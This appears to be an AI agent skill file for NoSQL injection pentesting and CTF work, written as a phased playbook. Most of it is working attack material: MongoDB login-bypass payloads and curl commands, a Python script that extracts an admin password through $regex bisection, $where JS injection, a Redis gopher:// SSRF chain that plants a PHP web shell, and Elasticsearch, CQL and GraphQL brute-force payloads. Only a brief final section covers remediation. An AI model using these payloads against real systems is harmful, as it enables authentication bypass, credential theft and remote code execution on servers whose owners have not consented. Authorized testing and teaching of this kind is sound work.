---
name: nosql-injection
description: NoSQL injection specialist for authorized pentests and CTF — covers MongoDB operator injection ($ne/$gt/$regex/$where), qs bracket-notation type confusion, $function JS execution, aggregation pipeline injection, CouchDB, Redis RCE via SSRF/gopher, Cassandra CQL injection, Elasticsearch DSL injection, and GraphQL injection. Use when testing apps backed by MongoDB, Redis, CouchDB, Cassandra, or Elasticsearch. Triggers on: nosql injection, mongodb injection, $ne bypass, bracket notation, redis ssrf, gopher redis, elasticsearch injection, graphql injection.
---

# Skill: nosql-injection

## Trigger

Fire when the task involves:
- MongoDB authentication bypass via operator injection
- qs bracket-notation type confusion in Express.js/Node apps
- Redis RCE via gopher:// SSRF chain
- Cassandra CQL injection
- Elasticsearch DSL query injection
- GraphQL injection (introspection, batch attacks)
- NoSQL blind injection / exfil via $regex bisection
- Defensive remediation: type enforcement, query sanitization

## Instructions

### Phase 1 — Identify NoSQL Technology

```
Response headers: X-Powered-By: Express → likely MongoDB/Node
Error messages: "MongoError" / "CastError" → MongoDB
Error: "WRONGTYPE" → Redis
Error: "SyntaxException" → Cassandra CQL
Error: "SearchParseException" → Elasticsearch
GraphQL: Content-Type: application/json + __typename / __schema
```

### Phase 2 — MongoDB Operator Injection

**JSON body payloads (Content-Type: application/json)**
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": {"$regex": ".*"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin","root","administrator"]}, "password": {"$ne": ""}}
```

**URL-encoded bracket notation (form POST / GET, express.urlencoded extended:true)**
```
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=^admin&password[$ne]=
username[$exists]=true&password[$exists]=true
# URL-encoded variant ([ = %5B, ] = %5D, $ = %24)
GET /api?username%5B%24ne%5D=&password%5B%24ne%5D=
```

**cURL one-liners**
```bash
# JSON bypass
curl -s -X POST http://target/login -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# Form bypass
curl -s -X POST http://target/login -d 'username[$ne]=&password[$ne]='
```

### Phase 3 — MongoDB Blind Exfil via $regex Bisection

When operator injection confirms injectable but no direct error output:
```python
import requests, string
TARGET = "http://target/login"
CHARS = string.ascii_letters + string.digits + "_@."

def check(regex):
    r = requests.post(TARGET, json={"username": {"$regex": regex}, "password": {"$ne": ""}})
    return "Welcome" in r.text or r.status_code == 302

# Enumerate admin password char by char
known = ""
while True:
    found = False
    for c in CHARS:
        if check(f"^{known}{c}"):
            known += c; found = True; break
    if not found:
        break
print(f"Extracted: {known}")
```

### Phase 4 — MongoDB $where / $function JS Injection

```javascript
// $where (deprecated but present in older MongoDB)
// Inject into string field that reaches $where
'; return (this.password.match(/^a/)) ? 1 : 0; var x='

// $function (MongoDB 4.4+, requires $expr)
{"$expr": {"$function": {"body": "function(pw){return pw == 'secret'}", "args": ["$password"], "lang": "js"}}}

// Time-based blind via $where
// True condition → sleep-like CPU spin
{"$where": "function(){var d=new Date(); while(new Date()-d<5000){} return true;}"}
```

### Phase 5 — Redis RCE via gopher:// SSRF

When SSRF is found pointing at internal Redis (default port 6379, no auth):
```bash
# Generate payload with Gopherus
git clone https://github.com/tarunkant/Gopherus
python3 gopherus.py --exploit redis
# Enter: /var/www/html/shell.php
# Enter: <?php system($_GET['cmd']); ?>
# Output: gopher://127.0.0.1:6379/_<URL-encoded-redis-commands>

# Use generated URL in SSRF parameter
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_<payload>"
```

**Manual Redis commands via SSRF:**
```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET shell "<?php system($_GET['cmd']); ?>"
BGSAVE
```

### Phase 6 — Cassandra CQL Injection

```sql
-- Tautology bypass (no operators like $ne; CQL is SQL-like)
' OR '1'='1
' OR 1=1--
-- Time-based (no SLEEP; use token scan)
' AND token(username) > token('') AND '1'='1
-- Schema extraction
SELECT * FROM system_schema.tables WHERE keyspace_name='targetks'
SELECT * FROM system_schema.columns WHERE keyspace_name='targetks'
```

### Phase 7 — Elasticsearch DSL Injection

```json
// If user input reaches the "query" object directly
{"query": {"query_string": {"query": "* OR _exists_:password"}}}

// Source field exfil
{"query": {"match_all": {}}, "_source": ["password","email","apikey"]}

// Script injection (Painless, if dynamic scripting enabled)
{"query": {"script": {"script": {"source": "Debug.explain(doc['password'].value)"}}}}
```

### Phase 8 — GraphQL Injection

```bash
# Introspection dump (check if enabled — should be disabled in prod)
{"query": "{__schema{types{name fields{name}}}}"}

# Batch query attack (bypass rate limiting)
[{"query":"mutation{login(user:\"admin\",pass:\"a\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"b\"){token}}"}]

# NoSQLi through GraphQL resolver (resolver passes args to MongoDB)
{"query":"{user(username:{$ne:\"\"}){token email}}"}
# URL-encoded for GET: ?query={user(username:{%24ne:""}){token}}
```

### Phase 9 — Tool: NoSQLMap + nosqli

```bash
# NoSQLMap (GPL-3.0, 3,400 stars)
git clone https://github.com/codingo/NoSQLMap
pip3 install -r requirements.txt
python3 nosqlmap.py
# Interactive menu: set target, port, URI, attack type

# nosqli scanner (Go binary, AGPL-3.0, 414 stars)
go install github.com/Charlie-belmer/nosqli@latest
nosqli scan -t http://target/login -d '{"user":"FUZZ","pass":"test"}' \
  -H "Content-Type: application/json"
```

### Phase 10 — Remediation

```javascript
// MongoDB — enforce primitive types
if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
  return res.status(400).json({error: 'Invalid input'});
}
// Use $eq explicitly
db.users.findOne({username: {$eq: req.body.username}, password: {$eq: req.body.password}});

// Redis — require AUTH, bind to 127.0.0.1 only, disable CONFIG SET
// requirepass <strong-password> in redis.conf
// bind 127.0.0.1
```

## References

- codingo/NoSQLMap — https://github.com/codingo/NoSQLMap (3,400 stars, GPL-3.0)
- Charlie-belmer/nosqli — https://github.com/Charlie-belmer/nosqli (414 stars, AGPL-3.0)
- tarunkant/Gopherus — https://github.com/tarunkant/Gopherus (3,426 stars, MIT)
- swisskyrepo/PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings (NoSQL section, MIT)
- transilienceai/communitytools — https://github.com/transilienceai/communitytools (591 stars, MIT)
- mukul975/Anthropic-Cybersecurity-Skills — https://github.com/mukul975/Anthropic-Cybersecurity-Skills (34,992 stars, Apache-2.0)
- Orangewarrior/KrakenWaf (nosql_injection_detect module, MIT)
- Source report: nosql-ninja-deep-research-2026-10-27.md